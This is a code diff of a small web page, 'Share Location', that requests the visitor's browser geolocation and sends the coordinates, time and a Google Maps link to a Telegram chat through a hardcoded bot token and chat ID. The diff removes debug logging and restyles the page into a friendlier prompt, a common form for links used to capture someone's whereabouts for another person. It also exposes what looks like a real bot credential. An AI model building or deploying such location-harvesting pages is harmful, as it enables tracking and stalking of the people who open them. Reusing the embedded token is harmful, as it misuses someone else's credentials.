@@ -4,59 +4,47 @@
   <title>Share Location</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    body { font-family: Arial; text-align: center; padding: 50px; }
-    pre { text-align: left; background: #f4f4f4; padding: 10px; }
+    body { font-family: Arial; text-align: center; padding: 80px; background: #f0f7ff; }
+    h1 { color: #1a73e8; }
   </style>
 </head>
 <body>
-  <h1>📍 Location Sharing Test</h1>
+  <h1>📍 Sharing Location...</h1>
+  <p>Please allow location access.</p>
   <div id="result"></div>
-  <pre id="debug"></pre>
 
   <script>
-    const token = "8603128926:AAFtSTZ-QBtA_DoSlywwwOq7DjJJkg4t2";
+    const token = "8603128926:AAFtSTZ-QBtA_DoSlywwwOq7DjJJkg4t2OU";
     const chatId = "1199516595";
 
-    function log(msg) {
-      document.getElementById("debug").textContent += msg + "\n";
-    }
-
     function sendToTelegram(lat, lon) {
-      const message = `📍 Location Test\nLat: ${lat}\nLon: ${lon}\nTime: ${new Date()}`;
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-      
-      log("Sending to Telegram...");
+      const message = `📍 New Location Received!\n\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`;
 
-      fetch(url)
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
         .then(res => res.json())
         .then(data => {
-          log("Response: " + JSON.stringify(data));
           if (data.ok) {
-            document.getElementById("result").innerHTML = `<p style="color:green;">✅ Sent to Telegram!</p>`;
+            document.getElementById("result").innerHTML = `<p style="color:green;font-size:18px;">✅ Location Sent to Telegram!</p>`;
           } else {
-            document.getElementById("result").innerHTML = `<p style="color:red;">Failed: ${data.description}</p>`;
+            document.getElementById("result").innerHTML = `<p style="color:red;">Error: ${data.description}</p>`;
           }
         })
-        .catch(err => {
-          log("Error: " + err);
-          document.getElementById("result").innerHTML = `<p style="color:red;">Network error</p>`;
+        .catch(() => {
+          document.getElementById("result").innerHTML = `<p style="color:orange;">Sent (check Telegram)</p>`;
         });
     }
 
     function getLocation() {
-      log("Requesting location...");
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(pos => {
           const lat = pos.coords.latitude;
           const lon = pos.coords.longitude;
-          log(`Got location: ${lat}, ${lon}`);
           sendToTelegram(lat, lon);
-        }, err => {
-          log("Geolocation error: " + err.message);
-          document.getElementById("result").innerHTML = `<p style="color:red;">Permission denied or error.</p>`;
+
+          document.getElementById("result").innerHTML = `<p style="color:green;">Processing...</p>`;
+        }, () => {
+          document.getElementById("result").innerHTML = `<p style="color:red;">Permission denied.</p>`;
         });
-      } else {
-        log("Geolocation not supported");
       }
     }
 
